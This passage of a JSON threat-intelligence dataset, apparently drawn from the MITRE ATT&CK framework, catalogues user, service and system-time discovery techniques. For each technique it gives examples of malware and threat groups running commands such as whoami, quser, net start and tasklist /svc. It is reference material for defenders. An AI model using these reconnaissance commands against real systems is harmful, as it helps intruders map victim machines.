"Bumblebee", "description": "Bumblebee has the ability to identify the user name."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used whoami to gather information from victim machines."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors collected whoami information via PowerShell scripts."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can gather the username from the system."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can collect the username from a victim machine."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can obtain a list of user accounts from a victim's machine."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has collected the username and UID from the infected machine."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used the quser command to show currently logged on users."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has included the victim's computer name and username in C2 messages sent to actor-owned infrastructure."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can retrieve the username from a targeted system."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can identify the username on a compromised host."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can execute getUsername on compromised systems."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can identify the user on a targeted system."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic can gather data on the user of a compromised host."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can discover and send the username from a compromised host to C2."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet gathers the username from the victim\u2019s machine."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has collected the username from a victim machine."}, {"id": "S0354", "name": "Denis", "description": "Denis enumerates and collects the username from the victim\u2019s machine."}, {"id": "S0021", "name": "Derusbi", "description": "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can collect the username from a compromised host."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can use the Windows user name to create a unique identification for infected users and systems."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper collects the victim username and sends it to the C2 server."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly used the command query user on victim hosts."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can obtain a list of users from an infected machine."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to identify the users on a compromised host."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca collected information on user accounts via the whoami command."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used tools to gather information about users."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has enumerated all users connected to network shares."}, {"id": "S0363", "name": "Empire", "description": "Empire can enumerate the username on targeted hosts."}, {"id": "S0091", "name": "Epic", "description": "Epic collects the user name from the victim\u2019s machine."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can obtain the username from the victim's machine."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux can run whoami to identify the system owner."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has collected the username from the infected host."}, {"id": "S0171", "name": "Felismus", "description": "Felismus collects the current username and sends it to the C2 server."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT collects the username from the victim\u2019s machine."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used Meterpreter to enumerate users on remote systems."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used the command cmd.exe /C quser to collect user session information."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has executed the command quser to display the session details of a compromised machine."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to run the whoami command on the system."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy enumerates the current user during the initial infection."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has the ability to gather user information from the targeted system using whoami/upn&whoami/fqdn&whoami/logonid&whoami/all."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used whoami and query user to obtain information about the victim user."}, {"id": "G0047", "name": "Gamaredon Group", "description": "A Gamaredon Group file stealer can gather the victim's username to send to a C2 server."}, {"id": "S0168", "name": "Gazer", "description": "Gazer obtains the current user's security identifier."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to distinguish between a standard user and an administrator on a compromised host."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to identify the current username of an infected host."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to enumerate the infected system's user name."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can collect the username from the victim's machine."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status)."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can identify the user id on a target machine."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used whoami to gather user information."}, {"id": "S0214", "name": "HAPPYWORK", "description": "can collect the victim user name."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL can collect the user name of the system."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has run whoami on compromised machines to identify the current user."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to collect the username on the infected host."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole lists local users and session information."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe collects the username from the victim\u2019s machine."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can obtain the victim user name."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar gathers information on users."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used implants capable of collecting the signed-in username."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can identify logged in users across the domain and views user sessions."}, {"id": "S0162", "name": "Komplex", "description": "The OsInfo function in Komplex collects the current running username."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can collect the username from the victim\u2019s machine."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can conduct basic network reconnaissance on the victim machine with whoami, to get user details."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects registered owner details by using the commands systeminfo and net config workstation."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can discover the username of an infected host."}, {"id": "G0032", "name": "Lazarus Group", "description": "Various Lazarus Group malware enumerates logged-on users."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. "}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can enumerate the account name on a targeted system."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can determine if the current user has admin privileges."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can collect the username from the system."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to discover the username on the infected host."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer has the ability to identify the username on a compromised host."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used a malicious DLL to collect the username from compromised hosts."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can collect user information from the targeted host."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can collect the username from the compromised machine."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can collect the username from a compromised host."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has obtained the victim username and sent it to the C2 server."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can retrieve the victim\u2019s username."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has the ability to identify the username and hostname on a compromised host."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can collect the username from a compromised host."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has collected the username from the victim's machine."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for identifying local users and administrators on victim machines."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia collects the username from the victim\u2019s machine."}, {"id": "S1015", "name": "Milan", "description": "Milan can identify users registered to a targeted machine."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox can gather the username from the victim\u2019s machine."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type runs tests to determine the privilege level of the compromised user."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet deployed various malware such as YouieLoader that can perform system user discovery actions."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind obtains the victim username."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has the capability to gather the username from the victim's machine."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito runs whoami on the victim\u2019s machine."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that can collect the victim\u2019s username."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu collects the username from the victim."}, {"id": "S0590", "name": "NBTscan", "description": "NBTscan can list active users on the system."}, {"id": "S0272", "name": "NDiskMonitor", "description": "NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can collect the user name from a victim's machine."}, {"id": "S1106", "name": "NGLite", "description": "NGLite will run the whoami command to gather system information and return this to the command and control server."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor gathers information on victim system users and usernames."}, {"id": "S0385", "name": "njRAT", "description": "njRAT enumerates the current user during the initial infection."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI can collect the username from the victim\u2019s machine."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can check for blocklisted usernames on infected endpoints."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can collect the username from the victim\u2019s machine."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has run whoami on a victim."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can collect the victim username."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the query user and whoami commands as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT sent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has commands to get the current user's name and SID."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has the ability to identify the current user on the infected host."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has the ability to identify the username on the compromised host."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect information about the currently logged in user by running whoami on a victim."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects information from the victim about the current user name."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has probed victim machines with whoami and has collected the username from the machine."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can identify the user name on a compromised system."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT gathers the victim username."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can enumerate the username and account type."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer gathers information on the infected system owner and user."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin determines whether it is successfully running on a victim system by querying the running account information to determine if it is running in Session 0, indicating running with elevated privileges."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA runs the whoami and query user commands."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can gather system owner information, including user and administrator privileges."}, {"id": "S0172", "name": "Reaver", "description": "Reaver collects the victim's username."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can obtain information about the current user."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT gathers the username from the system."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor executes the whoami on the victim\u2019s machine."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has the ability to identify the username on the compromised host."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can detect the username of the infected host."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin collects the victim\u2019s username and whether that user is an admin."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can collect the username from a compromised host."}, {"id": "S0148", "name": "RTM", "description": "RTM can obtain the victim username and permissions."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has run tests to determine the privilege level of the compromised user."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can collect the username from a compromised host."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has collected the username from a compromised host."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to identify the user on a compromised host."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper will attempt to enumerate the username of the victim."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has collected the username of the victim system."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has the ability to identify the username on the compromised host."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can collect the username on a targeted system."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used tools to identify the user of a compromised host."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can gather a list of logged on users."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has collected the username from a victim machine."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can obtain the id of a logged in user."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used whoami commands to identify system owners."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can use whoami to obtain the username from a compromised host."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can identify the username on a compromised host."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can execute getinfo  to identify the username on a compromised host."}, {"id": "S0543", "name": "Spark", "description": "Spark has run the whoami command and has a built-in command to identify the user logged in."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses the whoami command. "}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle can collect the user name from a compromised host."}, {"id": "S0058", "name": "SslMM", "description": "SslMM sends the logged-on username to its hard-coded C2."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can gather the username from an infected host."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers the registered user and primary owner name via WMI."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can collect the user name from the victim's machine."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected the username from a compromised host."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can collect the username from an infected host."}, {"id": "S0242", "name": "SynAck", "description": "SynAck gathers user names from infected hosts."}, {"id": "S0060", "name": "Sys10", "description": "Sys10 collects the account name of the logged-in user and sends it to the C2."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can collect the username from a compromised host."}, {"id": "S0098", "name": "T9000", "description": "T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used whoami to collect system user information."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can identify the user and groups the user belongs to on a compromised host."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can gather information about the user on a compromised host."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper used letmein to scan for saved usernames on the target system."}, {"id": "S0647", "name": "Turian", "description": "Turian can retrieve usernames."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger can obtain information about the victim usernames."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT has the capability to collect the current logged on user\u2019s username from a machine."}, {"id": "S0476", "name": "Valak", "description": "Valak can gather information regarding the user."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN gathers the username from the victim\u2019s machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used public tools and executed the PowerShell command Get-EventLog security -instanceid 4624 to identify associated user and computer account names."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can identify the current username on the victim system."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can collect the username on the victim machine to send to C2."}, {"id": "S0155", "name": "WINDSHIELD", "description": "WINDSHIELD can gather the victim user name."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used malware to identify the username on a compromised host."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can gather information on the victim username."}, {"id": "S0059", "name": "WinMM", "description": "WinMM uses NetUser-GetInfo to identify that it is running under an \"Admin\" account on the local system."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern PowerShell scripts execute whoami to identify the executing user."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used \"whoami\" to identify the local user and their privileges."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can retrieve a list of user accounts and usernames from an infected machine."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user."}, {"id": "S0248", "name": "yty", "description": "yty collects the victim\u2019s username."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy gets the username from the system."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2."}, {"id": "S0350", "name": "zwShell", "description": "zwShell can obtain the name of the logged-in user on the victim."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can collect the owner and organization information from the target workstation."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ can collect the username from a compromised host."}], "sub_techniques": []}, {"name": "System Service Discovery", "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.", "detailed_description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "id": "T1007", "examples": [{"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: net start >> %temp%\\download"}, {"id": "G0006", "name": "APT1", "description": "APT1 used the commands net start and tasklist to get a listing of the services on the system."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has attempted to discover services for third party EDR products."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can enumerate all services running on a compromised host."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can query service configuration information."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can check whether the service name FAX is present."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used TROJ_GETVERSION to discover system services."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can obtain a list of the services from a system."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used net start and net use for system service discovery."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can enumerate services on compromised hosts."}, {"id": "S0244", "name": "Comnie", "description": "Comnie runs the command: net start >> %TEMP%\\info.dat on a victim."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can query service status using QueryServiceStatusEx function."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can retrieve information about a compromised system's running services."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to identify running services on a compromised host."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used Tasklist to obtain information from a compromised host."}, {"id": "S0081", "name": "Elise", "description": "Elise executes net start after initial communication is made to the remote server."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to execute the command net start to interact with services."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the tasklist /svc command to list the services on the system."}, {"id": "S0049", "name": "GeminiDuke", "description": "GeminiDuke collects information on programs and services on the victim that are configured to automatically run at startup."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT has a feature to list the available services on the system."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy enumerates all Windows services."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can check if it is running as a service on a compromised host."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to retrieve a list of services on the infected host."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can monitor services."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro can list all services and their configurations."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can obtain running services on the victim."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can list running services."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can list running services."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can list local services."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs service discovery using net start commands."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used an instrumentor script to gather the names of all services running on a victim's system."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of running services with the command tasklist /svc."}, {"id": "S0582", "name": "LookBack", "description": "LookBack can enumerate services on the victim machine."}, {"id": "S0039", "name": "Net", "description": "The net start command can be used in Net to find information about Windows services."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used sc query on a victim to gather information about services."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net start command as part of their initial reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used the tasklist command to search for one of its backdoors."}, {"id": "G0033", "name": "Poseidon Group", "description": "After compromising a victim, Poseidon Group discovers all running services."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can enumerate service and service permission information."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can create and register a service for execution."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses tasklist /svc to display running tasks."}, {"id": "S0496", "name": "REvil", "description": "REvil can enumerate active services."}, {"id": "S0085", "name": "S-Type", "description": "S-Type runs the command net start on a victim."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to execute the net start command."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can search for modifiable services that could be used for privilege escalation."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has the capability to enumerate services."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can enumerate services on a victim machine."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot may use net start to display running services."}, {"id": "S0242", "name": "SynAck", "description": "SynAck enumerates all running services."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can collect a list of services on a victim machine."}, {"id": "S0057", "name": "Tasklist", "description": "Tasklist can be used to discover services running on a system."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot collects a list of install programs and services on the system\u2019s machine."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has gathered information about running services."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer queries the system to identify existing services."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used net start to list running services."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can enumerate services."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has the ability to discover and manipulate Windows services."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can check the services on the system."}], "sub_techniques": []}, {"name": "System Time Discovery", "description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or systemsetup on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.", "detailed_description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or systemsetup on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. In addition, adversaries can discover device uptime through functions such as GetTickCount() to determine how long it has been since the system booted up.\nOn network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.\nIn addition, system calls \u2013 such as time() \u2013 have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as systemsetup -gettimezone or timeIntervalSinceNow to gather current time zone information or current date and time.\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.", "id": "T1124", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can collect the timestamp from the victim\u2019s machine."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can pull a timestamp from the victim's machine."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth collects the timestamp from the infected machine. "}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has checked the system time before and after encryption."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can collect the time zone information from the system."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can obtain the DATETIME and UPTIME from a compromised machine."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can collect the time on the compromised host."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear has the ability to determine local time on a compromised host."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to collect the system UPTIME."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal can check the system time set on the infected host."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can collect the local time on a compromised host."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used net time to check the local time on a target system."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used the command net view /all time to gather the local time of a compromised network."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can collect the current time zone information from the victim\u2019s machine."}, {"id": "S0335", "name": "Carbon", "description": "Carbon uses the command net time \\127.0.0.1 to get information the system\u2019s time."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can determine the local time on targeted machines."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used time /t and net time \\ip/hostname for system time discovery."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can determine the current time."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday)."}, {"id": "S0608", "name": "Conficker", "description": "Conficker uses the current UTC victim system date for domain generation and connects to time servers to determine the current date."}, {"id": "S0115", "name": "Crimson", "description": "Crimson has the ability to determine the date and time on a compromised host."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM deployed mechanisms to check system time information following strategic website compromise attacks."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate creates a log file for capturing keylogging, clipboard, and related data using the victim host's current date for the filename. DarkGate queries victim system epoch time during execution. DarkGate captures system time information as part of automated profiling on initial installation."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel malware can obtain system time from a compromised host."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can collect time zone information and system UPTIME."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv can compare the current time on an infected host with a configuration value to determine when to start the encryption process."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD will set a timestamp value to determine when wiping functionality starts. When the timestamp is met on the system, a trigger file is created on the operating system allowing for execution to proceed. If the timestamp is in the past, the wiper will execute immediately."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use the GetTickCount and GetSystemTimeAsFileTime API calls to inspect system time."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP reads the infected system's current time and writes it to a log file during execution."}, {"id": "S0554", "name": "Egregor", "description": "Egregor contains functionality to query the local/system time."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the net time command  to get the system time from the machine and collect the current date and time zone information."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT gathers the time zone information from the 